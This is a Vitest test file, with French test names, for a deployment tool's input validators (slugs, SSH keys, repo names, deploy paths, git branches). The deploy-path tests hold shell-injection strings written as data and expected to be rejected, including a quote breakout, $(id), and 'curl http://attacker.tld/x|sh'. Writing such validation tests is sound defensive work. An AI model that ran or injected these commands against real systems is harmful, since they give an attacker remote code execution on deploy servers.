import { describe, it, expect } from "vitest";
import {
  slugify,
  isValidClientSlug,
  isValidSecretKey,
  isValidEnvName,
  isValidEmail,
  isValidServerName,
  isValidServerHost,
  isValidSshUser,
  isValidSshPrivateKey,
  isValidGithubRepo,
  isValidWorkflowFile,
  isValidGitBranch,
  defaultDeployPath,
  isValidDeployPath,
  isValidGitlabProjectPath,
  isValidBitbucketRepoUuid,
  isValidCiEnvironmentName,
  isValidGitlabIssuer,
  isValidBitbucketIssuer,
} from "@/lib/validation";

describe("lib/api — fonctions pures", () => {
  describe("slugify", () => {
    it("convertit en minuscules", () => {
      expect(slugify("MyProject")).toBe("myproject");
    });

    it("remplace les espaces et la ponctuation par des tirets", () => {
      expect(slugify("My Cool Project!")).toBe("my-cool-project");
    });

    it("strippe les diacritiques (NFD)", () => {
      expect(slugify("Comptabilité")).toBe("comptabilite");
      expect(slugify("Crème brûlée")).toBe("creme-brulee");
    });

    it("supprime les tirets de début/fin", () => {
      expect(slugify("---hello---")).toBe("hello");
      expect(slugify("  hello  ")).toBe("hello");
    });

    it("limite à 60 caractères", () => {
      expect(slugify("a".repeat(100)).length).toBe(60);
    });

    it("retourne une chaîne vide pour une entrée non-slugifiable", () => {
      expect(slugify("!!!")).toBe("");
      expect(slugify("")).toBe("");
    });

    it("collapse les séries de caractères non-slug", () => {
      expect(slugify("foo___bar...baz")).toBe("foo-bar-baz");
    });
  });

  describe("isValidClientSlug", () => {
    it("accepte les slugs lowercase ASCII + tirets", () => {
      expect(isValidClientSlug("acme")).toBe(true);
      expect(isValidClientSlug("acme-corp")).toBe(true);
      expect(isValidClientSlug("a")).toBe(true);
      expect(isValidClientSlug("test-123")).toBe(true);
    });

    it("refuse les majuscules, espaces, caractères spéciaux", () => {
      expect(isValidClientSlug("ACME")).toBe(false);
      expect(isValidClientSlug("acme corp")).toBe(false);
      expect(isValidClientSlug("acme_corp")).toBe(false);
      expect(isValidClientSlug("acmé")).toBe(false);
    });

    it("refuse les slugs commençant ou finissant par un tiret", () => {
      expect(isValidClientSlug("-acme")).toBe(false);
      expect(isValidClientSlug("acme-")).toBe(false);
      expect(isValidClientSlug("-")).toBe(false);
    });

    it("refuse les slugs vides ou trop longs (> 50)", () => {
      expect(isValidClientSlug("")).toBe(false);
      expect(isValidClientSlug("a".repeat(50))).toBe(true);
      expect(isValidClientSlug("a".repeat(51))).toBe(false);
    });
  });

  describe("isValidSecretKey", () => {
    it("accepte les clés conformes au format .env", () => {
      expect(isValidSecretKey("DATABASE_URL")).toBe(true);
      expect(isValidSecretKey("API_KEY_V2")).toBe(true);
      expect(isValidSecretKey("X")).toBe(true);
    });

    it("refuse les clés en minuscules", () => {
      expect(isValidSecretKey("database_url")).toBe(false);
    });

    it("refuse les clés commençant par un chiffre ou underscore", () => {
      expect(isValidSecretKey("1FOO")).toBe(false);
      expect(isValidSecretKey("_FOO")).toBe(false);
    });

    it("refuse les caractères spéciaux", () => {
      expect(isValidSecretKey("DB-URL")).toBe(false);
      expect(isValidSecretKey("DB.URL")).toBe(false);
      expect(isValidSecretKey("DB URL")).toBe(false);
    });

    it("refuse les clés trop longues (>128 chars)", () => {
      expect(isValidSecretKey("A" + "B".repeat(127))).toBe(true);
      expect(isValidSecretKey("A" + "B".repeat(128))).toBe(false);
    });
  });

  describe("isValidEnvName", () => {
    it("accepte les noms d'env classiques", () => {
      expect(isValidEnvName("production")).toBe(true);
      expect(isValidEnvName("staging")).toBe(true);
      expect(isValidEnvName("development")).toBe(true);
      expect(isValidEnvName("qa-1")).toBe(true);
      expect(isValidEnvName("preprod")).toBe(true);
    });

    it("refuse les noms en majuscules ou avec underscore", () => {
      expect(isValidEnvName("Production")).toBe(false);
      expect(isValidEnvName("pre_prod")).toBe(false);
    });

    it("refuse un nom commençant par un chiffre ou tiret", () => {
      expect(isValidEnvName("1prod")).toBe(false);
      expect(isValidEnvName("-prod")).toBe(false);
    });

    it("refuse un nom > 31 chars", () => {
      expect(isValidEnvName("a".repeat(31))).toBe(true);
      expect(isValidEnvName("a".repeat(32))).toBe(false);
    });
  });

  describe("isValidEmail", () => {
    it("accepte les emails classiques", () => {
      expect(isValidEmail("user@example.com")).toBe(true);
      expect(isValidEmail("first.last+tag@domain.co.uk")).toBe(true);
    });

    it("refuse les chaînes sans @", () => {
      expect(isValidEmail("plaintext")).toBe(false);
    });

    it("refuse les emails avec espaces", () => {
      expect(isValidEmail("a b@c.d")).toBe(false);
      expect(isValidEmail("ab@c d.e")).toBe(false);
    });

    it("refuse les emails sans TLD", () => {
      expect(isValidEmail("user@localhost")).toBe(false);
    });
  });

  describe("isValidServerName", () => {
    it("accepte les noms simples", () => {
      expect(isValidServerName("prod-vps-1")).toBe(true);
      expect(isValidServerName("VPS Argo")).toBe(true);
      expect(isValidServerName("backup.server")).toBe(true);
    });
    it("refuse les noms vides ou trop longs", () => {
      expect(isValidServerName("")).toBe(false);
      expect(isValidServerName("a".repeat(61))).toBe(false);
    });
    it("refuse les caractères de contrôle", () => {
      expect(isValidServerName("vps\nbreak")).toBe(false);
      expect(isValidServerName("vps;rm -rf")).toBe(false);
    });
  });

  describe("isValidServerHost", () => {
    it("accepte IPv4, IPv6 simplifié et hostname", () => {
      expect(isValidServerHost("51.158.10.1")).toBe(true);
      expect(isValidServerHost("vps-prod.argoweb.fr")).toBe(true);
      expect(isValidServerHost("2001:db8::1")).toBe(true);
    });
    it("refuse les schemes et espaces", () => {
      expect(isValidServerHost("https://vps.argoweb.fr")).toBe(false);
      expect(isValidServerHost("vps argoweb.fr")).toBe(false);
      expect(isValidServerHost("")).toBe(false);
    });
  });

  describe("isValidSshUser", () => {
    it("accepte les usernames POSIX", () => {
      expect(isValidSshUser("github-deploy")).toBe(true);
      expect(isValidSshUser("root")).toBe(true);
      expect(isValidSshUser("_systemd")).toBe(true);
    });
    it("refuse majuscules / commence par chiffre", () => {
      expect(isValidSshUser("Github")).toBe(false);
      expect(isValidSshUser("1user")).toBe(false);
      expect(isValidSshUser("user@host")).toBe(false);
    });
  });

  describe("isValidSshPrivateKey", () => {
    it("accepte une cle OpenSSH bien formée", () => {
      const key =
        "-----BEGIN OPENSSH PRIVATE KEY-----\n" +
        "b3BlbnNzaC1rZXktdjEAAAAA".repeat(10) +
        "\n-----END OPENSSH PRIVATE KEY-----";
      expect(isValidSshPrivateKey(key)).toBe(true);
    });
    it("accepte une cle PEM RSA", () => {
      const key =
        "-----BEGIN RSA PRIVATE KEY-----\n" +
        "MIIEpAIBAAKCAQEA".repeat(10) +
        "\n-----END RSA PRIVATE KEY-----";
      expect(isValidSshPrivateKey(key)).toBe(true);
    });
    it("refuse les clés vides ou tronquées", () => {
      expect(isValidSshPrivateKey("")).toBe(false);
      expect(isValidSshPrivateKey("not a key")).toBe(false);
      expect(isValidSshPrivateKey("-----BEGIN OPENSSH PRIVATE KEY-----")).toBe(
        false,
      );
    });
    it("refuse une cle publique", () => {
      expect(isValidSshPrivateKey("ssh-ed25519 AAAA... user@host")).toBe(false);
    });
  });

  describe("isValidGithubRepo", () => {
    it("accepte le format owner/repo", () => {
      expect(isValidGithubRepo("argo-web/voyages")).toBe(true);
      expect(isValidGithubRepo("user/repo.name")).toBe(true);
      expect(isValidGithubRepo("a/b")).toBe(true);
    });
    it("refuse les formats invalides", () => {
      expect(isValidGithubRepo("just-repo")).toBe(false);
      expect(isValidGithubRepo("/repo")).toBe(false);
      expect(isValidGithubRepo("user/")).toBe(false);
      expect(isValidGithubRepo("user//repo")).toBe(false);
      expect(isValidGithubRepo("user/repo/sub")).toBe(false);
      expect(isValidGithubRepo("user repo/x")).toBe(false);
    });
  });

  describe("isValidWorkflowFile", () => {
    it("accepte les fichiers .yml/.yaml", () => {
      expect(isValidWorkflowFile("deploy.yml")).toBe(true);
      expect(isValidWorkflowFile("ci.yaml")).toBe(true);
      expect(isValidWorkflowFile("redeploy.yml")).toBe(true);
    });
    it("refuse les fichiers sans extension yml", () => {
      expect(isValidWorkflowFile("deploy")).toBe(false);
      expect(isValidWorkflowFile("deploy.json")).toBe(false);
    });
    it("refuse les chemins (path traversal)", () => {
      expect(isValidWorkflowFile("../deploy.yml")).toBe(false);
      expect(isValidWorkflowFile("foo/deploy.yml")).toBe(false);
    });
  });

  describe("defaultDeployPath", () => {
    it("compose la convention argoweb /srv/projets/<env>/<slug>", () => {
      expect(defaultDeployPath("staging", "voyages")).toBe(
        "/srv/projets/staging/voyages",
      );
      expect(defaultDeployPath("production", "argo-cms")).toBe(
        "/srv/projets/production/argo-cms",
      );
    });
  });

  describe("isValidDeployPath", () => {
    it("accepte les chemins de deploy usuels", () => {
      expect(isValidDeployPath("/srv/projets/production/argo-cms")).toBe(true);
      expect(isValidDeployPath("/opt/app_v2")).toBe(true);
      expect(isValidDeployPath("/home/deploy/sites/my.site-1")).toBe(true);
      // La convention par defaut doit toujours passer sa propre validation.
      expect(isValidDeployPath(defaultDeployPath("staging", "voyages"))).toBe(
        true,
      );
    });

    it("refuse tout ce qui peut s'echapper d'une commande shell", () => {
      // Le vecteur de F8.1 : une quote ferme le `DEPLOY_DIR='…'` distant.
      expect(isValidDeployPath("/srv/projets/production/app';id>/tmp/pwned;'")).toBe(
        false,
      );
      expect(isValidDeployPath("/srv/`whoami`")).toBe(false);
      expect(isValidDeployPath("/srv/$(id)")).toBe(false);
      expect(isValidDeployPath("/srv/x\ncurl http://attacker.tld/x|sh")).toBe(
        false,
      );
      expect(isValidDeployPath("/srv/a b")).toBe(false);
      expect(isValidDeployPath("/srv/app&&id")).toBe(false);
    });

    it("refuse les chemins relatifs, la traversee et les formes ambigues", () => {
      expect(isValidDeployPath("srv/projets/app")).toBe(false);
      expect(isValidDeployPath("../../../../etc")).toBe(false);
      expect(isValidDeployPath("/srv/../../etc")).toBe(false);
      expect(isValidDeployPath("/srv//projets")).toBe(false);
      expect(isValidDeployPath("/srv/projets/")).toBe(false);
      expect(isValidDeployPath("/")).toBe(false);
      expect(isValidDeployPath("")).toBe(false);
      expect(isValidDeployPath(`/srv/${"a".repeat(300)}`)).toBe(false);
    });
  });

  describe("isValidGitBranch", () => {
    it("accepte les branches usuelles", () => {
      expect(isValidGitBranch("main")).toBe(true);
      expect(isValidGitBranch("release/2026.05")).toBe(true);
      expect(isValidGitBranch("feat/oidc")).toBe(true);
    });
    it("refuse les patterns invalides", () => {
      expect(isValidGitBranch("..main")).toBe(false);
      expect(isValidGitBranch("main..")).toBe(false);
      expect(isValidGitBranch("main/")).toBe(false);
      expect(isValidGitBranch("main.lock")).toBe(false);
      expect(isValidGitBranch("/main")).toBe(false);
      expect(isValidGitBranch("ma in")).toBe(false);
      expect(isValidGitBranch("")).toBe(false);
    });
  });

  describe("isValidGitlabProjectPath", () => {
    it("accepte group/project et sous-groupes", () => {
      expect(isValidGitlabProjectPath("acme/web")).toBe(true);
      expect(isValidGitlabProjectPath("acme/team/web")).toBe(true);
      expect(isValidGitlabProjectPath("a-b_c.d/proj.ect")).toBe(true);
    });
    it("refuse un segment unique, vide, ou les bordures invalides", () => {
      expect(isValidGitlabProjectPath("web")).toBe(false);
      expect(isValidGitlabProjectPath("acme/")).toBe(false);
      expect(isValidGitlabProjectPath("/web")).toBe(false);
      expect(isValidGitlabProjectPath("acme//web")).toBe(false);
      expect(isValidGitlabProjectPath("")).toBe(false);
      expect(isValidGitlabProjectPath("acme/we b")).toBe(false);
    });
  });

  describe("isValidBitbucketRepoUuid", () => {
    it("accepte un UUID avec ou sans accolades", () => {
      expect(
        isValidBitbucketRepoUuid("{11111111-2222-3333-4444-555555555555}"),
      ).toBe(true);
      expect(
        isValidBitbucketRepoUuid("11111111-2222-3333-4444-555555555555"),
      ).toBe(true);
    });
    it("refuse les non-UUID", () => {
      expect(isValidBitbucketRepoUuid("acme/web")).toBe(false);
      expect(isValidBitbucketRepoUuid("{not-a-uuid}")).toBe(false);
      expect(isValidBitbucketRepoUuid("")).toBe(false);
    });
  });

  describe("isValidCiEnvironmentName", () => {
    it("accepte vide (wildcard) et des noms usuels", () => {
      expect(isValidCiEnvironmentName("")).toBe(true);
      expect(isValidCiEnvironmentName("production")).toBe(true);
      expect(isValidCiEnvironmentName("review/feature-1")).toBe(true);
    });
    it("refuse les caractères de contrôle / trop long", () => {
      expect(isValidCiEnvironmentName(" leadingspace")).toBe(false);
      expect(isValidCiEnvironmentName("a".repeat(101))).toBe(false);
    });
  });

  describe("isValidGitlabIssuer", () => {
    it("accepte vide (gitlab.com) et une URL https d'instance", () => {
      expect(isValidGitlabIssuer("")).toBe(true);
      expect(isValidGitlabIssuer("https://gitlab.acme.io")).toBe(true);
      expect(isValidGitlabIssuer("https://gitlab.acme.io:8443")).toBe(true);
    });
    it("refuse http et le non-URL", () => {
      expect(isValidGitlabIssuer("http://gitlab.acme.io")).toBe(false);
      expect(isValidGitlabIssuer("gitlab.acme.io")).toBe(false);
    });
  });

  describe("isValidBitbucketIssuer", () => {
    it("accepte l'URL OIDC du workspace", () => {
      expect(
        isValidBitbucketIssuer(
          "https://api.bitbucket.org/2.0/workspaces/acme/pipelines-config/identity/oidc",
        ),
      ).toBe(true);
    });
    it("refuse une URL qui ne suit pas le pattern", () => {
      expect(isValidBitbucketIssuer("")).toBe(false);
      expect(isValidBitbucketIssuer("https://gitlab.acme.io")).toBe(false);
      expect(
        isValidBitbucketIssuer(
          "https://api.bitbucket.org/2.0/workspaces/acme/pipelines-config/identity/oidc/extra",
        ),
      ).toBe(false);
    });
  });
});
